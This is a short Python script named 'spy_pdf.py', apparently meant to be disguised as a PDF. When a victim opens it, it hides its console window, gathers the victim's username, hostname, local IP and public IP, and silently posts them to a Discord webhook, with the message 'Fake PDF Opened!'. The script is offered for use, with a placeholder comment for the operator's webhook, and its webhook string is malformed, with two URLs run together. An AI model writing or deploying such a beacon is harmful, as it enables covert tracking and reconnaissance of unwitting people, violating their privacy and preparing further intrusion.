# spy_pdf.py - Silent Recon Beacon
import requests
import os
import socket
import time
import ctypes
import sys

# === ⚠️ CHANGE THIS TO YOUR DISCORD WEBHOOK ===
WEBHOOK = "https://discord.com/api/webhooks/https://discordapp.com/api/webhooks/1547609479242326016/XUwdWXwfxnJFELuClPeFiTWLqti8o4o86gVD6y8fRk2uzBwq8du5t58L3uMZ7WlN_wA4"  # ← PASTE YOUR LINK HERE

# Hide console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    try:
        user = os.getlogin()
        pc = socket.gethostname()
        ip = socket.gethostbyname(pc)
        try:
            public_ip = requests.get("https://ifconfig.me", timeout=5).text
        except:
            public_ip = "Unknown"

        msg = f"""
**🎯 Fake PDF Opened!**  
**User:** {user}
**PC:** {pc}
**Local IP:** {ip}
**Public IP:** {public_ip}
**Time:** {time.ctime()}
**Script:** spy_pdf.py
        """

        requests.post(WEBHOOK, json={"content": msg}, timeout=10)
    except:
        pass  # Silent fail
    sys.exit()

if __name__ == "__main__":
    main()
